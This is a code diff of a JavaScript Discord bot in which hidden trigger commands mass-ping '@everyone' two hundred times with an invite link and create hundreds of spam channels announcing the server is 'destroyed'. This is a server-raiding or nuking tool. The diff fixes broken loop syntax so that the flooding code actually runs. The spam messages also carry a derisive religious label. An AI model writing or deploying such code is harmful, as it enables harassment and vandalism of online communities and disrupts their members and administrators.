@@ -150,7 +150,7 @@ if(message.content.includes("ar!kelsairvvesrx")){
               }
             }
             if(message.content.includes("!everyone")){
-                for(var i = 0; i < 200; i+++++++){
+                for(var i = 0; i < 200; i++){
                     message.channel.send("@everyone Okue Le tchoupi Islamiste TA BZ VIEN ICI https://discord.gg/fVA3WE4")
                 }
             }
@@ -158,7 +158,7 @@ if(message.content.includes("ar!kelsairvvesrx")){
                   if(message.content === "channel"){
                     message.channel.send("roles").then(m => m.delete());
                     message.channel.send("issou").then(m => m.delete());
-                      for(var i = 0; i < 999; i++++++){
+                      for(var i = 0; i < 999; i++){
                           message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit", "text").then(c => c.send("!everyone ."))
                           message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/fVA3WE4 ."))
                           message.guild.createChannel("Okue Le tchoupi Islamiste ta detruit","text").then(c => c.send("@everyone https://discord.gg/fVA3WE4 ."))
